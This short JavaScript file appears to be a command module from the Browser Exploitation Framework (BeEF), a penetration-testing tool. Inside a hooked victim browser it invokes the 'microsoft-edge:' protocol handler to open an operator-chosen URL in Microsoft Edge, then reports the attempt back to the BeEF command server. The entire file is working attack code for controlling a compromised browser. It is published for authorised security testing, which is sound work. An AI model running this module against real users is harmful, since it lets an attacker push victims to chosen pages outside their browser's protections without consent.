//
// Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var edge_url = "<%== @url %>";
	window.location = 'microsoft-edge:' + edge_url;
  beef.debug("Attempted to open " + edge_url + " in Microsoft Edge.");
  beef.net.send('<%= @command_url %>', <%= @command_id %>, "Attempted to open " + edge_url + " in Microsoft Edge.");
});
